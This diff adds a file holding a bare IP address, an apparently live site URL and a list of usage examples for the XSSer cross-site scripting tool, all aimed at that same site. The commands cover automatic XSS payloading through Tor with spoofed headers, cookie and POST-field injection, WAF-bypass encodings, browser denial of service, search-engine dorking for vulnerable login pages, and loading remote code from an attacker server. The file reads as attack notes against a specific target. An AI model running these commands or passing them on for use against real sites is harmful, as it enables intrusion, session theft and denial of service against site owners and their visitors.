@@ -1,0 +1,80 @@
+http://128.199.102.111/
+http://toolst0re.net/acceso.asp
+
+sudo apt-get install python-pycurl python-xmlbuilder python-beautifulsoup python-geoip
+
+Examples:
+* View HELP (Available commands):
+
+xsser -h (--help)
+* Check for latest stable version:
+
+xsser --update
+* Launch GTK interface (GUI):
+
+xsser --gtk
+* Simple injection from URL:
+xsser -u "http://toolst0re.net"
+
+* Simple injection from File, with Tor proxy and spoofing HTTP Referer headers:
+xsser -i "file.txt" --proxy "http://127.0.0.1:8118" --referer "666.666.666.666" 
+
+* Multiple injections from URL, with automatic payloading, establishing a reverse connection (to certify that target is 100% vulnerable) and showing statistics:
+xsser -u "http://toolst0re.net" --auto --reverse-check -s
+
+* Multiple injections from URL, with automatic payloading, using Tor proxy, using "Hexadecimal" encoding, with verbose output and saving results to file (XSSreport.raw):
+xsser -u "http://toolst0re.net" --auto --proxy "http://127.0.0.1:8118" --Hex --verbose --save
+
+* Multiple injections from URL, with automatic payloading, using character encoding mutations (first, changing payload to 'Hexadecimal'; second, changing to 'StringFromCharCode' the first one; third, reencoding to 'Hexadecimal' the second one), with HTTP User-Agent spoofed, changing timeout to "20" and using multithreads (5 threads):
+xsser -u "http://toolst0re.net" --auto --Cem "Hex,Str,Hex" --user-agent "XSSer Pentesting Tool" --timeout "20" --threads "5"
+
+* Advanced injection from File, payloading your -own- code and using Unescape() character encoding to bypass filters:
+xsser -i "urls.txt" --payload "!enter your injection code here!" --Une
+
+* Injection from Dork, selecting "google" as search engine:
+xsser --De "google" -d "search.php?q="
+
+* Injection from a list of Dorks extracted from a file (provided by XSSer) and using all search engines supported (XSSer Storm!):
+xsser -l --Da
+
+* Injection from Crawler with deep 3 and 4 pages to review (XSSer Spider!):
+xsser -c3 --Cw=4 -u "http://toolst0re.net"
+
+* Simple injection from URL, to a POST parameter (ex: password), with statistics results:
+xsser -u "http://toolst0re.net/index.php" -p "target=login&user=admin&password=XSS" -s
+
+* Multiple injections to multiple parameters, using POST:
+xsser -u "http://toolst0re.net/index.php" -p "target=XSS&user=XSS&password=XSS" --auto
+
+* Simple injection from URL, using GET, injecting on Cookie, trying to use DOM shadow space (no server logging!) and if exists any vulnerability, exploiting your -own- final code:
+xsser -u "http://toolst0re.net" -g "/path?vuln=XSS" --Coo --Dom --Fp="!enter your injection code here!"
+
+* Simple injection from URL, using GET and if exists any vulnerability, exploiting a DoS (Denegation Of Service) code for browsers:
+xsser -u "http://toolst0re.net" -g "/path?vuln=XSS" --Dos
+
+* Multiple injections to multiple places, extracting targets from a File, applying automatic payloading, changing timeout to "20" and using multithreads (5 threads), increasing delay between requests to 10 seconds, injecting parameters in HTTP USer-Agent, HTTP Referer and Cookies, using proxy Tor, with IP Octal obfuscation, with statistics results and using verbose mode (real playing mode!): 
+xsser -i "list_of_url_targets.txt" --auto --timeout "20" --threads "5" --delay "10" --Xsa --Xsr --Coo --proxy "http://127.0.0.1:8118" --Doo -s --verbose
+
+* Injection of a XSS code provided by user on a -fake- image:
+xsser --Imx "test.png" --payload "!enter your injection code here!" 
+
+* Report output 'positives' injections from a dorking search (using all search engines) to a XML file:
+xsser -d "login.php" --Da --xml "security_report_XSSer_Dork_login-php_allengines.xml" 
+
+* Create a Flash movie with a standard XSS code embedded:
+xsser --fla "movie.swf"
+
+* Send a pre-checking hash to see if target is generating -false positive- replies:
+xsser -u "http://toolst0re.net" --hash
+
+* Discover parameters filtered by using heuristics:
+xsser -u "http://toolst0re.net" --heuristic
+
+* Exploiting Base64 code encoding in META tag (rfc2397) after inject a manual payload:
+xsser -u "http://toolst0re.net" -g "/path?vuln=XSS" --payload "!enter your injection code here!" --B64
+
+* Exploiting your "own" -remote code- in a payload discovered using automatic fuzzing:
+xsser -u "http://toolst0re.net" -g "/wp-login.php?vuln=XSS" --auto --Fr "https://attacker_server.org/path/code.js"
+
+* Apply an Anti-antiXSS bypasser (ex: Imperva) before to inject you -own- code and using verbose output:
+xsser -u "http://toolst0re.net" -g "/path?vuln=XSS" --Imperva --payload "!enter your injection code here!" -v
